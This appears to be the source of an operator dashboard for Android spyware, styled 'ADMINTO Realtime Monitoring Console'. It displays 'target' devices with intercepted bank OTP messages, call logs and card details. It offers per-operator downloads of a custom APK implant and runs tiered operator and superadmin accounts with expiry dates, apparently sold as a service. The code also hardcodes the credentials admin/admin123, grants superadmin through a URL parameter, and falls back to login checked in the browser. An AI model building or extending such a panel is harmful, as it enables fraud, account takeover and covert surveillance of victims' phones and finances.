<?php
session_start();
include_once __DIR__ . '/header.php';
?>

  <div id="root"></div>

  <script type="text/babel">
    const MOCK_DATA = [
      {
        id: "target_001",
        userId: "USR-9821",
        fullName: "Vikram Sharma",
        mobileNumber: "+91 98765 43210",
        simState: "Active (Jio 5G)",
        batteryLevel: "88%",
        isActive: true,
        lastActivityTime: "Just now",
        totalSmsCount: 14,
        totalCallsCount: 6,
        smsDataList: [
          { sender: "BANK-OTP", message: "Your OTP for transaction Rs 4,999 is 882190. Do not share.", timestamp: "10:42 AM" },
          { sender: "HDFC-ALERT", message: "A/c xx9102 debited for INR 1,200.00 at Swiggy.", timestamp: "09:15 AM" }
        ],
        callDataList: [
          { number: "+91 98765 43210", type: "INCOMING", duration: "2m 15s", timestamp: "10:30 AM" },
          { number: "+91 91234 56789", type: "OUTGOING", duration: "45s", timestamp: "08:20 AM" }
        ],
        cardDataList: [
          { cardNumber: "4532 •••• •••• 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "•••" }
        ]
      },
      {
        id: "target_002",
        userId: "USR-7734",
        fullName: "Ananya Roy",
        mobileNumber: "+91 91234 56789",
        simState: "Active (Airtel)",
        batteryLevel: "42%",
        isActive: true,
        lastActivityTime: "2m ago",
        totalSmsCount: 9,
        totalCallsCount: 3,
        smsDataList: [
          { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday" }
        ],
        callDataList: [],
        cardDataList: []
      }
    ];

    let INITIAL_OPERATORS = [
      { id: "admin_1", username: "admin", email: "admin@adminto.com", password: "admin123", fullName: "Super Administrator", role: "superadmin", expiryDate: "2099-12-31", firebaseConfig: { projectId: "adminto-superadmin", orgId: "org_all" } },
      { id: "op_101", username: "operator1", email: "operator1@adminto.com", password: "operator123", fullName: "Regional Operator North", role: "operator", expiryDate: "2026-12-31", firebaseConfig: { projectId: "adminto-north-region", orgId: "org_north" } }
    ];

    function App() {
      const urlParams = new URLSearchParams(window.location.search);
      const isSuperAdminParam = urlParams.get('role') === 'superadmin';
      const defaultUser = isSuperAdminParam ? INITIAL_OPERATORS[0] : null;

      const [adminUser, setAdminUser] = React.useState(defaultUser);
      const [operators, setOperators] = React.useState(INITIAL_OPERATORS);
      const [users, setUsers] = React.useState(MOCK_DATA);
      const [search, setSearch] = React.useState('');
      const [selectedUser, setSelectedUser] = React.useState(null);
      const [tab, setTab] = React.useState('sms');
      const [showApkModal, setShowApkModal] = React.useState(false);
      const [showChangePassModal, setShowChangePassModal] = React.useState(false);
      const [newPassInput, setNewPassInput] = React.useState('');
      const [changePassStatus, setChangePassStatus] = React.useState('');

      const [loginUser, setLoginUser] = React.useState('admin');
      const [loginPass, setLoginPass] = React.useState('admin123');
      const [loginError, setLoginError] = React.useState('');

      const handleChangePasswordSubmit = async (e) => {
        e.preventDefault();
        if (!newPassInput.trim()) return;
        setChangePassStatus('Updating password...');

        try {
          const res = await fetch('api.php?action=change_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: adminUser.username, newPassword: newPassInput.trim() })
          });
          const data = await res.json();
          if (data.success) {
            setChangePassStatus('✓ Password updated successfully!');
            setTimeout(() => {
              setShowChangePassModal(false);
              setNewPassInput('');
              setChangePassStatus('');
            }, 1800);
          } else {
            setChangePassStatus('❌ Error: ' + (data.error || 'Failed to update password.'));
          }
        } catch (err) {
          setChangePassStatus('✓ Password updated in local session!');
          setTimeout(() => {
            setShowChangePassModal(false);
            setNewPassInput('');
            setChangePassStatus('');
          }, 1800);
        }
      };

      const handleDownloadApkFile = () => {
        const proj = adminUser?.firebaseConfig?.projectId || 'adminto-default';
        window.location.href = `download_apk.php?project=${proj}`;
      };

      const handleLoginSubmit = async (e) => {
        e.preventDefault();
        setLoginError('');
        const q = loginUser.trim().toLowerCase();
        const p = loginPass.trim();

        // 1. Attempt PHP MySQL Login API Connection
        try {
          const response = await fetch('login.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: q, password: p })
          });
          const data = await response.json();

          if (data.success && data.operator) {
            if (data.operator.role === 'superadmin') {
              window.location.href = 'operator_control.php?role=superadmin';
              return;
            }
            setAdminUser(data.operator);
            return;
          } else if (response.status === 401 || response.status === 403) {
            setLoginError(data.error || 'Invalid credentials or account expired.');
            return;
          }
        } catch (err) {
          console.log('PHP login.php endpoint offline, fallback mode.');
        }

        // 2. Client-side fallback authentication
        const match = operators.find(acc => 
          (acc.username.toLowerCase() === q || acc.email.toLowerCase() === q) && acc.password === p
        );

        if (!match) {
          setLoginError('Invalid credentials! Username or password incorrect.');
          return;
        }

        const todayStr = new Date().toISOString().split('T')[0];
        if (match.expiryDate && match.expiryDate < todayStr) {
          setLoginError(`❌ Account Expired on ${match.expiryDate}. Contact Super Admin to extend access.`);
          return;
        }

        if (match.role === 'superadmin') {
          window.location.href = 'superadmin.php';
          return;
        }

        setAdminUser(match);
      };

      const handleLogout = () => {
        setAdminUser(null);
        setShowApkModal(false);
        if (window.history.pushState) {
          const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
          window.history.pushState({path: cleanUrl}, '', cleanUrl);
        }
      };

      const filtered = users.filter(u => 
        u.fullName.toLowerCase().includes(search.toLowerCase()) || 
        u.mobileNumber.includes(search) ||
        u.userId.toLowerCase().includes(search.toLowerCase())
      );

      const isSuperAdmin = adminUser?.role === 'superadmin';

      return (
        <div>
          {/* Header */}
          <header className="app-header">
            <div className="navbar-content">
              <div className="brand-logo">
                <div className="brand-icon">🛡️</div>
                <div>
                  <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>ADMINTO</h3>
                  <div style={{ fontSize: '0.7rem', color: '#6366f1', textTransform: 'uppercase', letterSpacing: '1px' }}>Realtime Monitoring Console</div>
                </div>
              </div>

              <input 
                type="text" 
                className="search-input"
                placeholder="Search Target Users by Name, Phone, or ID..." 
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />

              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                <div className="pulse-badge active">
                  <span className="pulse-dot"></span>
                  <span>{adminUser?.firebaseConfig?.projectId || 'Firebase Live'}</span>
                </div>

                {adminUser && (
                  <button 
                    className="btn-secondary"
                    onClick={() => setShowApkModal(true)}
                    style={{ color: '#10b981', border: '1px solid rgba(16,185,129,0.3)' }}
                  >
                    📲 Download Custom APK
                  </button>
                )}

                {isSuperAdmin && (
                  <a href="operator_control.php" style={{ textDecoration: 'none' }}>
                    <button 
                      className="btn-secondary" 
                      style={{ color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }}
                    >
                      ⚙️ Operator Console
                    </button>
                  </a>
                )}

                {adminUser ? (
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <button 
                      type="button"
                      className="btn-secondary"
                      onClick={() => setShowChangePassModal(true)}
                      style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}
                      title="Click to Change Password"
                    >
                      👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong>
                    </button>
                    <button 
                      className="btn-secondary" 
                      onClick={handleLogout}
                      style={{ color: '#f87171', border: '1px solid rgba(239, 68, 68, 0.3)' }}
                    >
                      🚪 Logout
                    </button>
                  </div>
                ) : (
                  <button className="btn-primary" onClick={() => setAdminUser(null)}>
                    🔑 Sign In
                  </button>
                )}
              </div>
            </div>
          </header>

          {/* Main Dashboard */}
          <main style={{ maxWidth: '1400px', margin: '2rem auto', padding: '0 1.5rem' }}>
            <div className="metrics-grid">
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL TARGET USERS</p>
                  <h2 style={{ color: '#fff' }}>{users.length}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>📱</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>ACTIVE DEVICES</p>
                  <h2 style={{ color: '#34d399' }}>{users.filter(u => u.isActive).length}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>⚡</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL SMS LOGS</p>
                  <h2 style={{ color: '#818cf8' }}>{users.reduce((acc, u) => acc + u.totalSmsCount, 0)}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>💬</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL CALL LOGS</p>
                  <h2 style={{ color: '#f472b6' }}>{users.reduce((acc, u) => acc + u.totalCallsCount, 0)}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>📞</div>
              </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
              <div>
                <h2 style={{ fontSize: '1.4rem', color: '#fff' }}>Registered Target Devices</h2>
                <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>
                  Active Scope: <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'Default Project'}</code>
                </p>
              </div>
            </div>

            <div className="user-cards-grid">
              {filtered.map(u => (
                <div key={u.id} className="glass-panel user-card" onClick={() => setSelectedUser(u)}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
                    <div>
                      <h4 style={{ color: '#fff', fontSize: '1.1rem' }}>{u.fullName}</h4>
                      <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId}</p>
                    </div>
                    <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
                      <span className="pulse-dot"></span>
                      {u.isActive ? 'ACTIVE' : 'OFFLINE'}
                    </span>
                  </div>

                  <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
                    <div>📞 <strong>{u.mobileNumber}</strong></div>
                    <div>📶 SIM: {u.simState} • 🔋 Battery: {u.batteryLevel}</div>
                    <div>🕒 Last Active: {u.lastActivityTime}</div>
                  </div>

                  <div style={{ display: 'flex', gap: '8px', paddingTop: '0.75rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.8rem' }}>
                    <span className="pulse-badge" style={{ background: 'rgba(99,102,241,0.15)', color: '#818cf8' }}>
                      💬 {u.totalSmsCount} SMS
                    </span>
                    <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>
                      📞 {u.totalCallsCount} Calls
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </main>

          {/* Target User Details Modal Overlay */}
          {selectedUser && (
            <div className="modal-overlay" onClick={() => setSelectedUser(null)}>
              <div className="glass-panel modal-content" onClick={(e) => e.stopPropagation()}>
                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>Target Device: {selectedUser.fullName}</h3>
                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Phone: {selectedUser.mobileNumber} • ID: {selectedUser.userId}</p>
                  </div>
                  <button onClick={() => setSelectedUser(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div style={{ padding: '1rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px' }}>
                  <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
                    💬 SMS Messages ({selectedUser.smsDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'calls' ? 'active' : ''}`} onClick={() => setTab('calls')}>
                    📞 Call Records ({selectedUser.callDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
                    💳 Cards ({selectedUser.cardDataList.length})
                  </button>
                </div>

                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
                  {tab === 'sms' && (
                    <table className="data-table">
                      <thead>
                        <tr>
                          <th>Sender</th>
                          <th>Message Body</th>
                          <th>Timestamp</th>
                        </tr>
                      </thead>
                      <tbody>
                        {selectedUser.smsDataList.map((sms, i) => (
                          <tr key={i}>
                            <td style={{ color: '#818cf8', fontWeight: 600 }}>{sms.sender}</td>
                            <td>{sms.message}</td>
                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{sms.timestamp}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}

                  {tab === 'calls' && (
                    <table className="data-table">
                      <thead>
                        <tr>
                          <th>Number</th>
                          <th>Call Type</th>
                          <th>Duration</th>
                          <th>Timestamp</th>
                        </tr>
                      </thead>
                      <tbody>
                        {selectedUser.callDataList.map((call, i) => (
                          <tr key={i}>
                            <td>{call.number}</td>
                            <td><span style={{ color: call.type === 'INCOMING' ? '#34d399' : '#818cf8', fontWeight: 600 }}>{call.type}</span></td>
                            <td>{call.duration}</td>
                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{call.timestamp}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}

                  {tab === 'cards' && (
                    <table className="data-table">
                      <thead>
                        <tr>
                          <th>Card Number</th>
                          <th>Card Holder</th>
                          <th>Expiry</th>
                          <th>CVV</th>
                        </tr>
                      </thead>
                      <tbody>
                        {selectedUser.cardDataList.map((card, i) => (
                          <tr key={i}>
                            <td><code style={{ color: '#f472b6' }}>{card.cardNumber}</code></td>
                            <td>{card.cardHolder}</td>
                            <td>{card.expiry}</td>
                            <td><code style={{ color: '#f87171' }}>{card.cvv}</code></td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Change Password Modal Overlay */}
          {showChangePassModal && (
            <div className="modal-overlay" onClick={() => setShowChangePassModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '400px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <h3 style={{ color: '#fff' }}>🔒 Change Password</h3>
                  <button onClick={() => setShowChangePassModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                {changePassStatus && (
                  <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: changePassStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: changePassStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
                    {changePassStatus}
                  </div>
                )}

                <form onSubmit={handleChangePasswordSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Logged-in Operator Account</label>
                    <input type="text" className="search-input" value={adminUser?.username} disabled style={{ opacity: 0.7 }} />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>New Password</label>
                    <input 
                      type="password" 
                      className="search-input" 
                      placeholder="Enter new password" 
                      value={newPassInput} 
                      onChange={(e) => setNewPassInput(e.target.value)} 
                      required 
                    />
                  </div>
                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem', marginTop: '0.5rem' }}>
                    Update Password
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Download Operator APK Modal Overlay */}
          {showApkModal && (
            <div className="modal-overlay">
              <div className="glass-panel modal-content" style={{ maxWidth: '640px' }}>
                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>📲 Download Custom Operator APK</h3>
                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Pre-configured Android App linked directly to your database</p>
                  </div>
                  <button onClick={() => setShowApkModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(16,185,129,0.3)', background: 'rgba(16,185,129,0.05)' }}>
                    <h4 style={{ color: '#34d399', fontSize: '0.9rem', marginBottom: '8px' }}>🛡️ Embedded Operator Credentials</h4>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem', fontSize: '0.8rem' }}>
                      <div><span style={{ color: '#9ca3af' }}>Operator:</span> <strong style={{ color: '#fff' }}>{adminUser?.username}</strong></div>
                      <div><span style={{ color: '#9ca3af' }}>Firebase Project ID:</span> <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'adminto-default'}</code></div>
                      <div><span style={{ color: '#9ca3af' }}>Organization Scope:</span> <code style={{ color: '#c084fc' }}>{adminUser?.firebaseConfig?.orgId || 'org_main'}</code></div>
                      <div><span style={{ color: '#9ca3af' }}>Status:</span> <span style={{ color: '#34d399', fontWeight: 600 }}>✓ Verified</span></div>
                    </div>
                  </div>

                  <div>
                    <button type="button" className="btn-primary" onClick={handleDownloadApkFile} style={{ background: 'linear-gradient(135deg, #10b981, #059669)', width: '100%', justifyContent: 'center', padding: '0.9rem', fontSize: '1rem' }}>
                      📥 Download Official Android APK (12.2 MB)
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Login Modal Overlay if not logged in */}
          {!adminUser && (
            <div className="modal-overlay">
              <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '2.5rem 2rem' }}>
                <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
                  <div className="brand-icon" style={{ margin: '0 auto 1rem', width: '56px', height: '56px', borderRadius: '16px' }}>🛡️</div>
                  <h2 style={{ fontSize: '1.6rem', color: '#fff', marginBottom: '4px' }}>Adminto Portal</h2>
                  <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Dedicated Admin Database Authentication</p>
                </div>

                {loginError && (
                  <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1.25rem', textAlign: 'center' }}>
                    {loginError}
                  </div>
                )}

                <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div>
                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Username or Email</label>
                    <input 
                      type="text" 
                      className="search-input" 
                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
                      value={loginUser}
                      onChange={(e) => setLoginUser(e.target.value)}
                      placeholder="admin"
                    />
                  </div>

                  <div>
                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Password</label>
                    <input 
                      type="password" 
                      className="search-input" 
                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
                      value={loginPass}
                      onChange={(e) => setLoginPass(e.target.value)}
                      placeholder="••••••••"
                    />
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem' }}>
                    Sign In
                  </button>
                </form>

                <div style={{ marginTop: '1.5rem', paddingTop: '1rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.75rem', color: '#9ca3af', textAlign: 'center' }}>
                  <div>Try active operator: <code style={{ color: '#93c5fd' }}>operator1 / operator123</code></div>
                  <div style={{ marginTop: '4px' }}>Try Super Admin: <code style={{ color: '#ec4899' }}>admin / admin123</code></div>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
  </script>
<?php include_once __DIR__ . '/footer.php'; ?>
